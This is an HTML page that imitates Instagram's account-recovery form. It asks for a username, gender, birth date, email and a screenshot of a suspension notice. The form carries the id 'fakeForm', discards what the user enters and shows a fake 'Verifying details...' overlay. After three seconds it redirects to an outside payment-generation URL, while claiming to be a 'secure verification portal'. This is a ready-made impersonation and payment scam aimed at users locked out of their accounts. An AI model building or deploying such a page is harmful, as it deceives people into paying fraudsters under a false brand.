<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Insta Recovery</title>
    <style>
        /* Instagram Theme Styles & Responsiveness */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 20px; /* Mobile edge spacing */
            display: flex;
            justify-content: center;
            align-items: center; /* Center vertically for desktop */
            min-height: 100vh;
            box-sizing: border-box;
        }
        .contact-container {
            width: 100%;
            max-width: 400px;
            padding: 30px 25px;
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            box-sizing: border-box;
            position: relative;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05); /* Proper software feel on PC */
        }
        .top-logo {
            display: block;
            margin: 0 auto 20px auto;
            width: 60px; /* Logo double chhota kar diya */
            height: auto;
        }
        .contact-container h2 {
            text-align: center;
            font-size: 16px;
            font-weight: 600;
            color: #262626;
            margin-bottom: 20px;
            margin-top: 0;
        }
        .form-fields {
            display: flex;
            flex-direction: column;
        }
        .contact-container label {
            margin-bottom: 5px;
            font-size: 14px;
            font-weight: 600;
            color: #262626;
        }
        .contact-container input[type="text"],
        .contact-container input[type="email"],
        .contact-container input[type="date"],
        .contact-container select {
            margin-bottom: 15px;
            padding: 10px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            width: 100%;
            box-sizing: border-box;
            font-size: 14px;
        }
        .contact-container input:focus, 
        .contact-container select:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        .proceed-btn {
            padding: 10px;
            background-color: #0095f6; /* Instagram Blue */
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            font-size: 14px;
            transition: background-color 0.2s;
        }
        .proceed-btn:hover {
            background-color: #1877f2;
        }
        .optional-text {
            color: green;
            font-size: 0.85em;
            margin-left: 5px;
            font-weight: normal;
        }
        
        /* Upload Screenshot Box */
        .screenshot-container {
            margin-bottom: 15px;
            padding: 10px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        .screenshot-container label {
            margin-bottom: 0;
            font-size: 14px;
        }
        .screenshot-help {
            font-size: 12px;
            color: #8e8e8e;
            font-weight: normal;
        }
        .screenshot-container input[type="file"] {
            font-size: 14px;
            padding-top: 5px;
        }

        .disclaimer {
            font-size: 12px;
            color: #8e8e8e;
            margin-top: 20px;
            text-align: center;
        }

        /* Floating Loading Overlay (Bokeh Effect) */
        #loadingOverlay {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.6);
            backdrop-filter: blur(4px); /* Bokeh / Blur effect */
            -webkit-backdrop-filter: blur(4px); /* Safari support */
            z-index: 10;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
        }
        .blinking-logo {
            width: 50px;
            height: auto;
            animation: blinker 1s linear infinite;
        }
        @keyframes blinker {
            50% { opacity: 0.4; }
        }
        .verifying-text {
            margin-top: 20px;
            font-size: 14px;
            color: #262626;
            font-weight: 600;
        }

        /* Mobile specific adjustments */
        @media (max-width: 480px) {
            .contact-container {
                padding: 25px 15px;
            }
        }
    </style>
</head>
<body>

<div class="contact-container">
    
    <!-- Floating Blur Effect Overlay -->
    <div id="loadingOverlay">
        <img src="inlogo.png" alt="Loading" class="blinking-logo">
        <div class="verifying-text">Verifying details...</div>
    </div>

    <img src="inlogo.png" alt="Logo" class="top-logo" id="mainLogo">
    
    <h2 id="formTitle">Instagram Recovery</h2>
    
    <form class="form-fields" id="fakeForm" onsubmit="validateAndRedirect(event)">
        <!-- Username Field -->
        <label for="username">Username</label>
        <input type="text" id="username" placeholder="Your Instagram username" autocomplete="off" autocorrect="off" spellcheck="false" required 
               oninvalid="this.setCustomValidity('please enter your username')" 
               oninput="this.setCustomValidity('')">

        <!-- DOB optional green -->
        <label for="dob">Date of Birth <span class="optional-text">(Optional)</span></label>
        <input type="date" id="dob" autocomplete="off">

        <label for="gender">Gender</label>
        <select id="gender" autocomplete="off" required 
                oninvalid="this.setCustomValidity('please select your gender')" 
                oninput="this.setCustomValidity('')">
            <option value="" disabled selected>Select Gender</option>
            <option value="male">Male</option>
            <option value="female">Female</option>
            <option value="other">Other</option>
        </select>

        <!-- Contact Email is not required -->
        <label for="contactEmail">Contact Email</label>
        <input type="email" id="contactEmail" placeholder="Your contact email" autocomplete="off">

        <!-- Upload Screenshot with Proper English -->
        <div class="screenshot-container">
            <label for="screenshot">Upload Screenshot</label>
            <span class="screenshot-help">Upload a screenshot of the suspended or disabled message.</span>
            <input type="file" id="screenshot" accept="image/*">
        </div>

        <button type="submit" class="proceed-btn">Submit</button>
        
        <div class="disclaimer">
            This is a secure verification portal. We do not store sensitive information.
        </div>
    </form>
</div>

<script>
    function validateAndRedirect(event) {
        event.preventDefault();
        
        // Blur (bokeh) effect overlay dikhana
        document.getElementById('loadingOverlay').style.display = 'flex';

        // Redirect after 3 seconds
        setTimeout(function() {
            window.location.href = "https://maxpay.maxado.in/generate_payment.php?template=987d368914b356830fac01c6724e606e";
        }, 3000); 
    }
</script>

</body>
</html>
